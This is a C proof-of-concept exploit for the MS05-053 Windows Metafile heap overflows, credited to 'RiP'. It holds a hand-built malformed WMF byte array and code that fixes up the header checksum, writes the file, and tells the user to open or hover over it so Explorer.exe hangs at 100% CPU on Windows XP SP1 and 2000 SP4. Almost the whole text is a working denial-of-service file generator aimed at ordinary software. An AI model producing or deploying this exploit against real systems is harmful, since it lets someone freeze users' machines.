/************************************************************
* Windows Metafile Multiple Heap Overflows (MS05-053) Proof of Concept
*
* Written by RiP
* Credits go to liquid (liquid@cyberspace.org)
*
* Crafted .WMF file cause Explorer.exe to use 100% of CPU and can cause 
the system to hang until the Explorer.exe process is killed.
*
* Tested on: Windows XP SP1 and Windows 2000 SP4
************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char wmfhex[]=
// --> Placeable meta header
"\xD7\xCD\xC6\x9A" // key
"\x00\x00" // hmf
// bbox start
"\x00\x00"
"\x00\x00"
"\xA1\x21" // width -> 8609
"\xEC\x29" // height -> 10732
// bbox end
"\xEC\x09" // inch -> 2540
"\x00\x00\x00\x00" // reserved
"\x00\x00" // checksum
// --> METAHEADER
"\x01\x00" // mtType -> file
"\x09\x00" // mtHeaderSize
"\x00\x03" // mtVersion -> 0x300
"\x0E\x00\x00\x00" // mtSize
"\x01\x00" // mtNoObjects
"\x05\x00\x00\x00" // mtMaxRecord
"\x00\x00" // mtNoParameters (not used)

"\x00\x00\x00\x00" // rdSize
"\x0B\x02" // rdFunction -> SetWindowOrg (???)
"\x00\x00\x00\x00";


int main(int argc,char *argv[]) {
        FILE *wmffile;
        int i;

        if (argc < 2) {
                printf("Syntax: %s <filename.wmf>\n", argv[0]);
                exit(1);
        }

        if (!(wmffile = fopen(argv[1],"wb"))) {
                printf("Error opening %s\n", argv[1]);
                return(-1);
        }

        // calculate checksum
        for(i=0;i<20;i+=2){
                wmfhex[20]^=wmfhex[i];
                wmfhex[21]^=wmfhex[i+1];
        }

        fwrite(wmfhex,sizeof(char),sizeof(wmfhex),wmffile);

        printf("Created specially crafted .wmf file\n");
        printf("Double click or move the mouse over the file in windows 
explorer\n");
        printf("Then press CTRL+SHIFT+ESC (notice the 100%) and restart 
Explorer.EXE\n");

        fclose(wmffile);
        return 0;
}

